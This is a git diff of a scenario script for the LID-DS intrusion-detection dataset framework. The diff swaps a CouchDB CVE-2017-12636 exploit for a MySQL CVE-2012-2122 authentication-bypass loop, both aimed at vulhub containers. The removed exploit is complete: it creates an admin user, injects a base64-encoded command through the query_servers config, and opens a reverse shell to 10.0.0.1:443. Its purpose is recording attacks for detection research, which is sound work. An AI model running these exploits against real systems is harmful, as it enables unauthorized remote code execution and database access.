@@ -3,13 +3,13 @@ import sys
 import json
 import base64
 import random
+import subprocess
 
-from cloudant.client import Cloudant
+import pymysql
+
 from requests.auth import HTTPBasicAuth
 from lid_ds.core import Scenario
 from lid_ds.sim import Behaviour
-
-
 
 warmt = int(sys.argv[1])
 rect = int(sys.argv[2])
@@ -23,57 +23,27 @@ warmup_time = warmt
 exploit_time = random.randint(int(rect * .3), int(rect * .8))
 print("Exploit time : {}".format(str(exploit_time)))
 
-class CVE_2017_12636(Scenario):
+class CVE_2012_2122(Scenario):
     def exploit(self, container):
-        print('hello i wanted to exploit {}'.format(container))
-        target = 'http://localhost:5984'
-        command = rb"""sh -i >& /dev/tcp/10.0.0.1/443 0>&1"""
-        version = 1
+        subprocess.Popen(r'''#!/bin/bash
+                for i in `seq 1 1000`;
+                do
+                    mysql -uroot -pwrong -h 127.0.0.1 -P3306 ;
+                done''', shell=True, executable='/bin/bash')
 
-        session = requests.session()
-        session.headers = {
-            'Content-Type': 'application/json'
-        }
-        # session.proxies = {
-        #     'http': 'http://127.0.0.1:8085'
-        # }
-        session.put(target + '/_users/org.couchdb.user:wooyun', data='''{
-            "type": "user",
-            "name": "wooyun",
-            "roles": ["_admin"],
-            "roles": [],
-            "password": "wooyun"
-        }''')
-
-        session.auth = HTTPBasicAuth('wooyun', 'wooyun')
-
-        command = "bash -c '{echo,%s}|{base64,-d}|{bash,-i}'" % base64.b64encode(command).decode()
-        if version == 1:
-            session.put(target + ('/_config/query_servers/cmd'), data=json.dumps(command))
-        else:
-            host = session.get(target + '/_membership').json()['all_nodes'][0]
-            session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=json.dumps(command))
-
-        session.put(target + '/wooyun')
-        session.put(target + '/wooyun/test', data='{"_id": "wooyuntest"}')
-
-        if version == 1:
-            session.post(target + '/wooyun/_temp_view?limit=10', data='{"language":"cmd","map":""}')
-        else:
-            session.put(target + '/wooyun/_design/test', data='{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}')
     def wait_for_availability(self, container):
         try:
-            requests.get('http://localhost:5984')
+            db = pymysql.connect("localhost", "root", "123456")
         except Exception:
+            print('MySQL Server is still down!')
             return False
-        print('CouchDB Container is up')
+        print('MySQL server is up - we can start simulating users!')
         return True
 
-class CouchDBUser(Behaviour):
-    def __init__(self, host, port, uname, passwd, total_duration):
+class MySQLUser(Behaviour):
+    def __init__(self, host, uname, passwd, total_duration):
         super().__init__([], total_duration)
         self.host = host
-        self.port = port
         self.uname = uname
         self.passwd = passwd
         self.actions.append(self._init_normal)
@@ -82,14 +52,18 @@ class CouchDBUser(Behaviour):
 
     def _init_normal(self):
         try:
-            self.client = Cloudant(self.uname, self.passwd, url='{}:{}'.format(self.host, self.port))
-            self.session = self.client.session()
+            self.db = pymysql.connect("localhost", uname, passwd)
+            try:
+                self.db.cursor().execute('create database testdb')
+            except Exception as e:
+                print(e)
+            self.db = pymysql.connect("localhost", uname, passwd, "testdb")
         except:
             pass
 
     def do_normal(self):
         try:
-            self.client.create_database('hellodb')
+            pass
         except Exception as Error:
             pass
             #print(Error)
@@ -97,13 +71,13 @@ class CouchDBUser(Behaviour):
 behaviours = []
 for i in range(user_count):
     duration = random.random() * total_duration
-    behaviours.append(CouchDBUser("http://localhost", "5984", "wooyun", "wooyun", total_duration * (i/user_count)))
+    behaviours.append(MySQLUser("localhost", "root", "123456", total_duration * (i/user_count)))
     print('creating {}.th user with duration: {}'.format(i, duration))
 
-scenario = CVE_2017_12636(
-        'vulhub/couchdb:1.6.0',
+scenario = CVE_2012_2122(
+        'vulhub/mysql:5.5.23',
         port_mapping={
-            '5984/tcp':5984
+            '3306/tcp' : 3306
         },
         warmup_time=warmup_time,
         recording_time=(total_duration-warmup_time),
